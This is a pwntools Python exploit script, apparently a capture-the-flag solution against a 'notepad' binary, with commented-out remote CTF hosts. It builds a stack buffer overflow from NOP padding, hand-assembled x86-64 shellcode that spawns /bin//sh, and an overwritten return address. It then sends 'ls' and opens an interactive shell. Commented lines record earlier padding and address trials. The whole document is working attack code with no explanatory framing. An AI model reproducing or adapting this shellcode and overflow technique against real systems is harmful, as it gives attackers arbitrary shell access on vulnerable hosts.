from pwn import *

p = process("./notepad")
# p = remote("140.115.59.7", 11003)
# p = remote("ctf.adl.tw", 11003)
print(p.recv())
# raw_input("attach gdb")

# padding = cyclic(0xff+0xf)
# padding = "A" * cyclic_find("naaboaab") # full padding
# padding = "A" * cyclic_find("baabcaab") # inject pwntools default shellcode
# padding = b"\x90" * 96 # now
padding = b"\x90" * 80
# padding = b"\x90" * 128

# RIP = p64(0x4242424243434343) #CCCCBBBB
# RIP = p64(0x7fffffffe0f0) #Previous Address
# RIP = p64(0x7fffffffe170) #Previous Address
# RIP = p64(0x7fffffffe180) #Previous Address
# RIP = p64(0x7fffffffdf80) # return At 0x7fffffffdfb8
RIP = p64(0x7fffffffdf70) # return At 0x7fffffffdfb8

# changeRSP = b"""\x48\xBC\x08\xE0\xFF\xFF\xFF\x7F\x00\x00\xEB\x14\x90\x90\x90\x90"""
shellcode = b"""\x48\x83\xC4\x10\xEB\x0A\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6A\x42\x58\xFE\xC4\x48\x99\x52\xEB\x06\x90\x90\x90\x90\x90\x90\x49\x89\xD0\x49\x89\xD2\xEB\x08\x90\x90\x90\x90\x90\x90\x90\x90\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\xEB\x04\x90\x90\x90\x90\x57\x54\x5E\x0F\x05"""
NOP = b"\x90" * 8
tail = b"\x90" * 3


p.sendline(padding + shellcode + tail + RIP)
# p.sendline(padding + changeRSP +  NOP + RIP + shellcode)
p.sendline("ls")
p.interactive()